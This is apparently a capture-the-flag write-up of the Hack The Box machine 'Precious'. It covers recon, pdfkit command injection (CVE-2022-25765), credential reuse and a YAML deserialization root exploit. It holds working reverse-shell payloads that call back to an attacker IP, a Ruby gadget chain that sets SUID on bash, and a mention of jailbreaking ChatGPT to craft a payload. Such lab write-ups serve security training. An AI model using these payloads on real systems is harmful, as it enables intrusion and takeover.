---
description: 04-26-2023
---

# Precious (Easy)

<figure><img src="../../../.gitbook/assets/Precious (1).png" alt=""><figcaption></figcaption></figure>

## Information Gathering

Scanned all TCP ports:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
| http-server-header: 
|   nginx/1.18.0
|_  nginx/1.18.0 + Phusion Passenger(R) 6.0.15
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Convert Web Page to PDF
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Enumerated UDP ports:

```
N/A
```

Notes:

* 80 and 22 is open, providing a possible entry point from both ports
* Added precious.htb to /etc/hosts
* Viewed source code on precious.htb and could not find any secrets
* Exhausted enumeration, the only thing that is left is to play with the web application itself to see if we can break/force functionality

## Enumeration

### Port 80 - HTTP (nginx 1.18.0)

#### Visual Inspection

<figure><img src="../../../.gitbook/assets/image (6) (2).png" alt=""><figcaption></figcaption></figure>

#### Directory Bruteforce

```bash
dirsearch -u http://precious.htb
```

* No results

```
feroxbuster -u http://precious.htb ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://precious.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        2w       18c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       18l       42w      483c http://precious.htb/
[####################] - 40s    30000/30000   0s      found:1       errors:0      
[####################] - 40s    30000/30000   748/s   http://precious.htb/
```

* Nothing found

#### Subdomain Enumeration

```
ffuf -u http://precious.htb -H "Host: FUZZ.precious.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 145

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://precious.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.precious.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 145
________________________________________________

:: Progress: [4989/4989] :: Job [1/1] :: 1052 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
```

* No results

#### Web Server Fingerprinting

{% code overflow="wrap" %}
```
whatweb precious.htb
http://precious.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0 + Phusion Passenger(R) 6.0.15], IP[10.129.244.33], Ruby-on-Rails, Title[Convert Web Page to PDF], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-Powered-By[Phusion Passenger(R) 6.0.15], X-XSS-Protection[1; mode=block], nginx[1.18.0]
```
{% endcode %}

* nginx 1.18.0
* Ruby-on-Rails
* Phusion Passenger(R) 6.0.15 -- Ran searchsploit -- no luck

#### Vulnerability Scan

```
nikto -h http://precious.htb
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.129.244.33
+ Target Hostname:    precious.htb
+ Target Port:        80
+ Start Time:         2023-04-19 16:30:55 (GMT-4)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0 + Phusion Passenger(R) 6.0.15
+ /: Retrieved x-powered-by header: Phusion Passenger(R) 6.0.15.
+ /: Uncommon header 'x-runtime' found, with contents: Ruby.
+ /FFjnCpnU.chl+: Uncommon header 'x-cascade' found, with contents: pass.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ : Server banner changed from 'nginx/1.18.0 + Phusion Passenger(R) 6.0.15' to 'nginx/1.18.0'.
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ nginx/1.18.0 appears to be outdated (current is at least 1.20.1).
+ 7962 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2023-04-19 16:38:13 (GMT-4) (438 seconds)
```

* No findings

#### Web Application Testing

Decided to begin testing the web application at this point. Let's see if we can communicate back to our box via python web server:

<figure><img src="../../../.gitbook/assets/image (2) (1) (10).png" alt=""><figcaption></figcaption></figure>

Confirmed, we can communicate successfully. How can we exploit this behavior?

I attempted to make the application fetch itself, but that did not work.

#### Burpsuite Request Analysis

Upon starting a python web server and attempting to fetch myself, I noticed a % at the top of the Response in Burp. This is an obvious sign that some sort of template is used on the backend.&#x20;

<figure><img src="../../../.gitbook/assets/image (4) (16).png" alt=""><figcaption></figcaption></figure>

Since our server is utilizing Ruby-on-Rails, why not attempt Ruby SSTI? However, let's keep looking.

Let's download any generated PDF and read it's metadata contents with `exiftool`:

* By keeping our python web server running above, we can simply use our local web server to perform this task

<figure><img src="../../../.gitbook/assets/image (22) (1).png" alt=""><figcaption><p>Trigger the download from the browser</p></figcaption></figure>

```bash
exiftool ~/Downloads/u3k8cdohntpcw26oda5vcsnjcq8vo8k6.pdf
```

<figure><img src="../../../.gitbook/assets/image (2) (11).png" alt=""><figcaption><p>pdfkit v0.8.6 has been identified; we should look into this</p></figcaption></figure>

We can also view this same information in the request used to convert a web page to a PDF by capturing it in Burp:

<figure><img src="../../../.gitbook/assets/image (37) (1).png" alt=""><figcaption><p>Burp request</p></figcaption></figure>

<mark style="color:yellow;">This is why it is so important to enumerate! When enumerating, you want to view EVERYTHING; time permitting!</mark>

### OSINT

{% embed url="https://github.com/CyberArchitect1/CVE-2022-25765-pdfkit-Exploit-Reverse-Shell" %}

By simply Googling "<mark style="color:yellow;">pdfkit v0.8.6</mark>", I was able to quickly find multiple references to <mark style="color:yellow;">CVE-2022-25765</mark>

<figure><img src="../../../.gitbook/assets/image (37) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Exploitation

### Ruby-based Server Side Template Injection (SSTI) Stemming from CVE-2022-25765

I was able to test and locate this vulnerability using simple arithmetic logic directly into the user input field on the web app.&#x20;

After I was able to confirm code execution was taking place, the next logical step is to replace the benign payload with a more malicious one and attempt to execute a reverse shell.

Start HTTP server:

```bash
python3 -m http.server 80
```

Start nc listener:

```bash
nc -lnvp 1337
```

Via Curl Method:&#x20;

PoC:

{% code overflow="wrap" %}
```bash
CURL (modify bold values): curl 'TARGET-URL' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: TARGET_URL' -H 'Connection: keep-alive' -H 'Referer: TARGET_URL' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'url=http%3A%2F%2FLOCAL-IP%3ALOCAL-HTTP-PORT%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22LOCAL-IP%22%2CLOCAL-LISTEN-PORT%29%29%27%60'
```
{% endcode %}

Working Exploit:

{% code overflow="wrap" %}
```bash
curl 'http://precious.htb' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://precious.htb' -H 'Connection: keep-alive' -H 'Referer: http://precious.htb' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'url=http%3A%2F%2F10.10.14.97%3A80%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%2210.10.14.97%22%2C1337%29%29%27%60'
```
{% endcode %}

* Note that you need to put your port number of your local web server in the third-to-last entry&#x20;

<mark style="color:yellow;">Ruby SSTI Python-based Reverse Shell Payload</mark>:

* You can place this directly into the web app and obtain a reverse shell

{% code overflow="wrap" %}
```
http://10.10.14.38/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.38",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (2) (10).png" alt=""><figcaption></figcaption></figure>

Using a Jailbreak on ChatGPT, I was also able to craft a payload:

{% embed url="https://www.digitaltrends.com/computing/how-to-jailbreak-chatgpt/" %}

ChatGPT Payload (Jailbroken):

{% code overflow="wrap" %}
```
http://10.10.14.38/?name=#{`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.38\",1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'`}"}
```
{% endcode %}

* Unfortunately, this did not work

There was another way of doing this... If you download the generated PDF, you can use exiftool to view metadata and hex data. Inside at the end, there is a header that shows that it is generated by <mark style="color:yellow;">pdfkit v0.8.6.</mark>

{% embed url="https://github.com/UNICORDev/exploit-CVE-2022-25765" %}

## Privilege Escalation

We spawned in as the <mark style="color:yellow;">ruby</mark> user. There is another user named <mark style="color:red;">henry</mark> on the box too.

### Local enumeration

* I was unable to find anything where I spawned unfortunately
* There is strange port running internally -- 127.0.0.1:35389
  * Tried curling but it returned "request empty" maybe we should google this

#### Linpeas

```
/etc/nginx/sites-available/pdfapp.conf

╔══════════╣ Unexpected in /opt (usually empty)
total 16
drwxr-xr-x  3 root root 4096 Oct 26 08:28 .
drwxr-xr-x 18 root root 4096 Nov 21 15:11 ..
drwxr-xr-x  2 root root 4096 Oct 26 08:28 sample
-rwxr-xr-x  1 root root  848 Sep 25  2022 update_dependencies.rb

╔══════════╣ Executable files potentially added by user (limit 70)
2022-11-21+15:15:08.0729708500 /usr/local/sbin/laurel
2022-09-26+05:04:43.6880195170 /home/ruby/.bundle/config
2022-09-26+05:04:42.9800195060 /usr/local/bin/tilt
2022-09-26+05:04:42.8480195040 /usr/local/bin/rackup
2022-09-26+05:04:39.0520194460 /usr/local/bin/bundler
2022-09-26+05:04:39.0520194460 /usr/local/bin/bundle

/home/henry/user.txt
/home/henry/.bash_history
/home/ruby/.bundle
************ /home/ruby/.bundle/config ************
/home/ruby/.bash_history

/etc/pam.d/common-password
/tmp/passenger.hFvr192/full_admin_password.txt
/tmp/passenger.hFvr192/read_only_admin_password.txt
```

### PrivEsc vector

<mark style="color:yellow;">ruby</mark> -> <mark style="color:red;">henry</mark>

```
************ /home/ruby/.bundle/config ************
```

Cleartext credentials:

```
cat /home/ruby/.bundle/config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```

Escalate to <mark style="color:red;">henry</mark> user:

```
su henry
password: Q3c1AqGHtoI0aXAYFH
```

<figure><img src="../../../.gitbook/assets/image (29) (2).png" alt=""><figcaption><p>Cleartext credentials for henry found</p></figcaption></figure>

<mark style="color:red;">henry</mark> -> <mark style="color:green;">root</mark>

The first thing that I did was run `sudo -l` and this was the output:

```
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

/opt/update\_dependencies.rb:

```ruby
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```

When we try to execute /opt/update\_dependencies.rb with sudo permissions, we get an error that a file does not exist (dependencies.rb).

We can see that it is trying to pull data from a file named `dependencies.yml`.

Inside of /opt/sample/dependencies.yml, we can see yaml 0.1.1 and pdfkit v.0.8.6

Doing some OSINT on yaml 0.1.1, I was able to find a deserialization remote code execution exploit:

{% embed url="https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/" %}

* This appears to be the way that we have to go about escalating our privileges

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolveub
```

* From here, we can quickly identify the linux command `id` which points us in the direction of where we can inject a malicious command rather than `id`
* How about we simply place `chmod +s /bin/bash`?

<mark style="color:yellow;">Time to create a malicious dependencies.yaml file that the /opt/update\_dependencies.rb file will call with sudo permissions</mark>:

dependencies.yaml:

```
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: chmod +s /bin/bash
         method_id: :resolveub
```

Now execute the script with sudo permissions:

```
sudo /usr/bin/ruby /opt/update_dependencies.rb
```

<mark style="color:yellow;">Note</mark>: you will get errors, ignore them.

Now, check the permissions of `/bin/bash`:

```bash
ls -la /bin/bash
-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

<figure><img src="../../../.gitbook/assets/image (17) (2).png" alt=""><figcaption></figcaption></figure>

Gain root shell in /bin/bash:

```
/bin/bash -p
```

<figure><img src="../../../.gitbook/assets/image (1) (9).png" alt=""><figcaption><p>proof.txt</p></figcaption></figure>

